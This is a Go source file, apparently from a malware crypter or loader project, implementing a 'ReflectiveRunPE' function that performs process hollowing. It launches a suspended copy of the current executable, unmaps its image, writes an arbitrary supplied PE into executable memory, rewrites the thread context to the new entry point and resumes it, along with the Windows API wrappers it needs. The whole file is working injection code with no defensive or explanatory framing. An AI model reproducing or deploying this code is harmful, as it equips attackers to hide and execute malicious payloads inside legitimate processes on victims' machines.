//TODO:
// - Make functions work with the External RunPEs

package core

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

func ReflectiveRunPE(destPE []byte) bool {
	var handle syscall.Handle = 0
	var buf []byte
	size := uint32(1024)
	buf = make([]byte, size)
	procGetModuleFileNameA.Call(uintptr(handle), uintptr(unsafe.Pointer(&buf[0])), uintptr(size))
	buf = bytes.Trim(buf, "\x00")
	pathC := string(buf)
	cmd := windows.StringToUTF16Ptr(pathC)
	si := new(syscall.StartupInfo)
	pi := new(syscall.ProcessInformation)
	err2 := syscall.CreateProcess(cmd, nil, nil, nil, false, CREATE_SUSPENDED, nil, nil, si, pi)
	if err2 != nil {
		return false
	}
	hProcess := uintptr(pi.Process)
	hThread := uintptr(pi.Thread)
	ctx, err := IntGetThreadContext(hThread)
	if err != nil {
		return false
	}
	Rdx := binary.LittleEndian.Uint64(ctx[136:])
	baseAddr, err := ReadProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
	if err != nil {
		return false
	}
	destPEReader := bytes.NewReader(destPE)
	f, err := pe.NewFile(destPEReader)
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok { //OptionalHeader64 not found
		return false
	}
	if err := NtUnmapViewOfSection(hProcess, baseAddr); err != nil {
		return false
	}
	newImageBase, err := IntVirtualAllocEx(hProcess, baseAddr, oh.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return false
	}
	err = IntWriteProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
	if err != nil {
		return false
	}
	for _, sec := range f.Sections {
		secData, err := sec.Data()
		if err != nil {
			return false
		}
		err = IntWriteProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
		if err != nil {
			return false
		}
	}
	delta := int64(oh.ImageBase) - int64(newImageBase)
	if delta != 0 && false {
		rel := oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_BASERELOC]
		relSec := findRelocSec(rel.VirtualAddress, f.Sections)
		if relSec == nil { //.reloc not found
			return false
		}
		var read uint32
		d, err := relSec.Data()
		if err != nil {
			return false
		}
		rr := bytes.NewReader(d)
		for read < rel.Size {
			dd := new(pe.DataDirectory)
			binary.Read(rr, binary.LittleEndian, dd)
			read += 8
			reSize := (dd.Size - 8) / 2
			re := make([]baseRelocEntry, reSize)
			read += reSize * 2
			binary.Read(rr, binary.LittleEndian, re)
			for _, rrr := range re {
				if rrr.Type() == IMAGE_REL_BASED_DIR64 {
					rell := newImageBase + uintptr(rrr.Offset()) + uintptr(dd.VirtualAddress)
					raddr, err := ReadProcessMemoryAsAddr(hProcess, rell)
					if err != nil {
						return false
					}
					err = WriteProcessMemoryAsAddr(hProcess, rell, uintptr(int64(raddr)+delta))
					if err != nil {
						return false
					}
				} else {

				}
			}
		}

	}
	addrB := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
	err = IntWriteProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
	if err != nil {
		return false
	}
	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
	err = IntSetThreadContext(hThread, ctx)
	if err != nil {
		return false
	}
	_, err = IntResumeThread(hThread)
	if err != nil {
		return false
	}
	return true
}

func IntResumeThread(hThread uintptr) (count int32, e error) {
	ret, _, err := procResumeThread.Call(hThread)
	if ret == 0xffffffff {
		e = err
	}
	count = int32(ret)
	return
}

func IntVirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAllocationType int, flProtect int) (addr uintptr, e error) {
	ret, _, err := procVirtualAllocEx.Call(
		hProcess,
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	return
}

func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (data []byte, e error) {
	var numBytesRead uintptr
	data = make([]byte, size)
	r, _, err := procReadProcessMemory.Call(hProcess,
		lpBaseAddress,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	return
}

func IntWriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, data []byte, size uint32) (e error) {
	var numBytesRead uintptr
	r, _, err := procWriteProcessMemory.Call(hProcess,
		lpBaseAddress,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	return
}

func IntGetThreadContext(hThread uintptr) (ctx []uint8, e error) {
	ctx = make([]uint8, 1232)
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procGetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	return ctx, nil
}

func ReadProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr) (val uintptr, e error) {
	data, err := ReadProcessMemory(hProcess, lpBaseAddress, 8)
	if err != nil {
		e = err
	}
	val = uintptr(binary.LittleEndian.Uint64(data))
	return
}

func WriteProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr, val uintptr) (e error) {
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(val))
	err := IntWriteProcessMemory(hProcess, lpBaseAddress, buf, 8)
	if err != nil {
		e = err
	}
	return
}

func NtUnmapViewOfSection(hProcess uintptr, baseAddr uintptr) (e error) {
	r, _, err := procNtUnmapViewOfSection.Call(hProcess, baseAddr)
	if r != 0 {
		e = err
	}
	return
}

func IntSetThreadContext(hThread uintptr, ctx []uint8) (e error) {
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procSetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	return
}

func findRelocSec(va uint32, secs []*pe.Section) *pe.Section {
	for _, sec := range secs {
		if sec.VirtualAddress == va {
			return sec
		}
	}
	return nil
}
